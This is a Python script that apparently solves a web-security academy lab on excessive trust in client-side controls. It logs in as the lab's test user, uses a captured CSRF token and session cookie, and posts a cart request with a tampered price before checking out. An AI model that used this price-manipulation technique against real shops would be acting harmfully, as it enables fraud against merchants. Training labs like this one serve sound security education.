#######################################################################
#
# Lab: Excessive trust in client-side controls
#
# Hack Steps: 
#      1. Fetch login page
#      2. Extract the csrf token and session cookie
#      3. Login as wiener
#      4. Add the leather jacket to the cart with a modified price
#      5. Fetch wiener's cart
#      6. Extract the csrf token needed for placing order
#      7. Place order
#      8. Confirm order
#
#######################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a71009104cd2dbd8211edbd00ea0024.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)
    
    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)
    
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    cookies = { "session": session }
    login_as_wiener = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Adding the leather jacket to the cart with a modified price.. ", end="", flush=True)

    session = login_as_wiener.cookies.get("session")
    cookies = { "session": session }
    data = { "productId": "1", "redir": "PRODUCT", "quantity": "1", "price": "1000" }
    post_data("/cart", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Fetching wiener's cart.. ", end="", flush=True)

    wiener_cart = fetch("/cart", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Extracting the csrf token needed for placing order.. ", end="", flush=True)
    
    csrf_token = re.findall("csrf.+value=\"(.+)\"", wiener_cart.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗7⦘ Placing order.. ", end="", flush=True)

    data = { "csrf": csrf_token }
    post_data("/cart/checkout", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗8⦘ Confirming order.. ", end="", flush=True)
    
    fetch("/cart/order-confirmation?order-confirmed=true", cookies)
 
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()

